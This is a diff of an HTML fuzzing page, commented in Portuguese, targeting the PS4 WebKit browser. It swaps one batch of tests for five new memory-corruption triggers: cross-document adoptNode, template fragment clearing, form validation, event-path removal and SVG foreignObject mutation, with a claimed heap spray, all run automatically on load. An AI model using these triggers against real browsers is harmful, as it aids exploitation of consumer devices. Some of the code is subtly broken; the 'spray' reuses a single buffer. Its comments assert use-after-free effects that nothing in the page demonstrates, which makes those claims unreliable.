@@ -1,11 +1,12 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Fuzzing - Vetores Avancados</title>
+    <title>PS4 WebKit Fuzzing - Vetores DOM Isolados</title>
 </head>
 <body>
-    <h1>Testes de Corrupção WebCore - Lote 2</h1>
+    <h1>Testes de Corrupção WebCore - Lote 4</h1>
     <div id="log-container"></div>
 
     <script>
@@ -16,114 +17,128 @@
             document.getElementById("log-container").appendChild(p);
         }
 
-        // Teste 6: WebGL OOB (Out-of-Bounds)
-        // Força a alocação de buffers gráficos anômalos para estressar a camada ANGLE/Metal do navegador[cite: 91, 94].
-        function test6() {
-            logMsg("Iniciando Teste 6 (WebGL OOB)...");
+        // Teste 16: Adoção Cruzada de Nós (Cross-Document AdoptNode UAF)
+        // Cria um documento virtual em memória, extrai um nó dele e destrói o documento origem.
+        // O WebCore pode falhar ao atualizar os ponteiros de contexto (Document pointer) do nó órfão.
+        function test16() {
+            logMsg("Iniciando Teste 16 (Cross-Document AdoptNode)...");
             try {
-                let canvas = document.createElement("canvas");
-                let gl = canvas.getContext("webgl");
-                if (gl) {
-                    let buffer = gl.createBuffer();
-                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                    // Tenta alocar um tamanho anômalo para desestabilizar o mapeamento de memória em C++
-                    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1024), gl.STATIC_DRAW);
-                    gl.deleteBuffer(buffer);
-                    // Tenta forçar o uso do buffer recém-liberado no backend gráfico
-                    gl.bufferSubData(gl.ARRAY_BUFFER, 0, new Float32Array(10)); 
-                }
+                let doc = document.implementation.createHTMLDocument("fuzz_doc");
+                let orphanNode = doc.createElement("div");
+                doc.body.appendChild(orphanNode);
+                
+                // Quebra a referência do documento original para forçar a coleta
+                doc = null; 
+                
+                // Força um spray rápido para ocupar a memória do documento destruído
+                let spray = new Array(1000).fill(new ArrayBuffer(128));
+                
+                // Tenta adotar o nó cujo documento pai "não existe" mais
+                document.body.appendChild(document.adoptNode(orphanNode));
             } catch(e) {}
-            logMsg("Fim do Teste 6.");
+            logMsg("Fim do Teste 16.");
         }
 
-        // Teste 7: MessageChannel Race Condition
-        // Explora a transferência de portas de comunicação assíncronas enquanto a memória é limpa.
-        function test7() {
-            logMsg("Iniciando Teste 7 (MessageChannel Race)...");
+        // Teste 17: Corrupção de Fragmento via HTMLTemplateElement
+        // A tag <template> armazena nós em um DocumentFragment isolado no C++.
+        // Esvaziar o template enquanto manipulamos um filho direto pode vazar a referência.
+        function test17() {
+            logMsg("Iniciando Teste 17 (Template Fragment UAF)...");
             try {
-                let channel = new MessageChannel();
-                let port1 = channel.port1;
+                let tpl = document.createElement("template");
+                let frag = tpl.content; // Aponta para o DocumentFragment interno
+                let span = document.createElement("span");
+                frag.appendChild(span);
                 
-                port1.onmessage = function(e) {
-                    // Tenta acessar a porta durante o processamento da mensagem
-                    port1.close();
-                };
+                // Oblítera o conteúdo do template via parser HTML interno
+                tpl.innerHTML = "";
                 
-                // Transfere a porta e imediatamente tenta invalidá-la
-                window.postMessage("trigger", "*", [channel.port2]);
-                channel = null; 
+                // Tenta interagir com o filho que estava atrelado ao fragmento destruído
+                span.appendChild(document.createElement("b"));
             } catch(e) {}
-            logMsg("Fim do Teste 7.");
+            logMsg("Fim do Teste 17.");
         }
 
-        // Teste 8: Custom Elements & Shadow DOM UAF
-        // Brinca com o ciclo de vida (callbacks) de elementos customizados ao serem desconectados abruptamente.
-        function test8() {
-            logMsg("Iniciando Teste 8 (Shadow DOM UAF)...");
+        // Teste 18: Quebra de Iterador em Validação Síncrona de Formulário
+        // O WebCore usa um iterador nativo para varrer os elementos do form durante o checkValidity().
+        // Remover um elemento vizinho durante esse loop síncrono causa desvio de ponteiro.
+        function test18() {
+            logMsg("Iniciando Teste 18 (Form Validation Iterator Race)...");
             try {
-                class FuzzElement extends HTMLElement {
-                    disconnectedCallback() {
-                        // O elemento foi removido, mas tentamos reanexá-lo ou modificar seu Shadow Root a partir do limbo
-                        this.attachShadow({mode: 'open'}).innerHTML = "dangling root";
-                    }
-                }
-                customElements.define('fuzz-el', FuzzElement);
+                let form = document.createElement("form");
+                let input1 = document.createElement("input");
+                let input2 = document.createElement("input");
+                input1.required = true;
+                input2.required = true;
                 
-                let el = document.createElement('fuzz-el');
-                document.body.appendChild(el);
-                el.remove(); // Dispara o disconnectedCallback assincronamente no WebCore
+                form.appendChild(input1);
+                form.appendChild(input2);
+                document.body.appendChild(form);
+
+                // Quando o C++ estiver validando o input1, nós destruímos o input2 da memória
+                input1.addEventListener("invalid", () => {
+                    input2.remove();
+                });
+                
+                // Dispara o loop em C++
+                form.checkValidity();
             } catch(e) {}
-            logMsg("Fim do Teste 8.");
+            logMsg("Fim do Teste 18.");
         }
 
-        // Teste 9: WeakMap e Anomalia de Garbage Collection (GC)
-        // Oculta a referência de um nó DOM em um WeakMap e força um spray no Heap para confundir o coletor.
-        function test9() {
-            logMsg("Iniciando Teste 9 (WeakMap GC)...");
+        // Teste 19: Vetor de Propagação de Eventos (Event Path UAF)
+        // Quando um evento é disparado, o WebCore cria um array nativo (Event Path) com os nós.
+        // Destruir o nó alvo de dentro do seu próprio manipulador corrompe esse vetor.
+        function test19() {
+            logMsg("Iniciando Teste 19 (Event Path Propagation UAF)...");
             try {
-                let map = new WeakMap();
-                let node = document.createElement("span");
-                map.set(node, new ArrayBuffer(1024 * 1024)); // Aloca 1MB atrelado ao nó
+                let btn = document.createElement("button");
+                document.body.appendChild(btn);
                 
-                node.remove(); // Remove do DOM
-                node = null;   // Remove a referência principal
+                btn.addEventListener("fuzzEvent", (e) => {
+                    // Remove o nó da árvore DOM
+                    btn.remove();
+                    
+                    // Tenta acessar o caminho do evento, que agora contém um ponteiro liberado
+                    let path = e.composedPath(); 
+                });
                 
-                // Spray forçado para acionar o fastMalloc e o GC simultaneamente [cite: 73]
-                let spray = [];
-                for(let i = 0; i < 10000; i++) {
-                    spray.push(new String("spray").repeat(100));
-                }
+                // Despacha um evento customizado borbulhante
+                btn.dispatchEvent(new Event("fuzzEvent", {composed: true, bubbles: true}));
             } catch(e) {}
-            logMsg("Fim do Teste 9.");
+            logMsg("Fim do Teste 19.");
         }
 
-        // Teste 10: Range API e Deleção de Texto Síncrona
-        // O objeto Range do WebKit é notoriamente sensível quando os nós subjacentes são deletados sob ele.
-        function test10() {
-            logMsg("Iniciando Teste 10 (Range API OOB/UAF)...");
+        // Teste 20: SVG foreignObject Tree Mutation
+        // Elementos foreignObject permitem injetar HTML normal dentro do pipeline rigoroso do SVG.
+        // Remover a raiz SVG enquanto se manipula o nó HTML interno causa anomalias de layout.
+        function test20() {
+            logMsg("Iniciando Teste 20 (SVG foreignObject Mutation)...");
             try {
-                let textNode = document.createTextNode("Vulnerabilidade WebCore");
-                document.body.appendChild(textNode);
+                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+                let foreign = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
+                let div = document.createElement("div");
                 
-                let range = document.createRange();
-                range.setStart(textNode, 5);
-                range.setEnd(textNode, 15);
+                foreign.appendChild(div);
+                svg.appendChild(foreign);
+                document.body.appendChild(svg);
                 
-                // Deleta o nó que serve de fundação para o Range
-                textNode.remove();
+                // Remove o contêiner SVG inteiro
+                svg.remove();
                 
-                // Tenta extrair o conteúdo de uma região de memória que não pertence mais ao DOM ativo
-                let fragment = range.extractContents(); 
+                // Força o motor a recalcular o layout do nó HTML que estava no contexto SVG
+                div.innerHTML = "<b>trigger layout</b>";
+                let forceLayout = div.offsetHeight; 
             } catch(e) {}
-            logMsg("Fim do Teste 10.");
+            logMsg("Fim do Teste 20.");
         }
 
-        // Execução Sequencial com espaçamento para evitar acúmulo no loop de eventos
-        setTimeout(() => { test6(); }, 500);
-        setTimeout(() => { test7(); }, 1500);
-        setTimeout(() => { test8(); }, 2500);
-        setTimeout(() => { test9(); }, 3500);
-        setTimeout(() => { test10(); }, 4500);
+        // Execução Sequencial
+        setTimeout(() => { test16(); }, 500);
+        setTimeout(() => { test17(); }, 1500);
+        setTimeout(() => { test18(); }, 2500);
+        setTimeout(() => { test19(); }, 3500);
+        setTimeout(() => { test20(); }, 4500);
 
     </script>
 </body>
